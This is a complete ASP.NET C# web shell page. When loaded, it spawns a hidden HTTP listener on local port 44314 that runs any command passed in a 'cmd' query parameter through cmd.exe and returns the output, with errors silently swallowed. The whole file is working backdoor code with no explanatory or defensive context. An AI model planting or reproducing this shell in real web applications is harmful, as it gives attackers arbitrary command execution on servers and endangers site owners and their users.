<%@ Page Language="c#"%>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Threading" %>

<script runat="server">
    public class SimpleExecutionRemoteStub
    {
        public SimpleExecutionRemoteStub()
        {
            new Thread(Listen).Start();
        }

        private static void Listen()
        {
            try
            {
                if (!HttpListener.IsSupported) {
                    return;
                }
                    
                var listener = new HttpListener();
                listener.Prefixes.Add("http://localhost:44314/httplistener/");
                listener.Start();
                while (true)
                {
                    var context = listener.GetContext();
                    var request = context.Request;
                    var response = context.Response;
                    Stream stm = null;
                    string cmd = request.QueryString["cmd"];
                    if (!string.IsNullOrEmpty(cmd))
                    {
                        try
                        {
                            var p = new Process();
                            p.StartInfo.FileName = "cmd.exe";
                            p.StartInfo.Arguments = "/c " + cmd;
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardError = true;
                            p.Start();
                            var data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
                            response.StatusCode = 200;
                            response.ContentLength64 = data.Length;
                            stm = response.OutputStream;
                            stm.Write(data, 0, data.Length);
                        }
                        catch
                        {
                            response.StatusCode = 404;
                        }
                        finally
                        {
                            if (stm != null)
                                stm.Close();
                        }
                    }
                    else
                    {
                        response.StatusCode = 404;
                        response.OutputStream.Close();
                    }
                }
            }
            catch
            {
            }
        }
    }
</script>

<%
    SimpleExecutionRemoteStub sers = new SimpleExecutionRemoteStub();
%>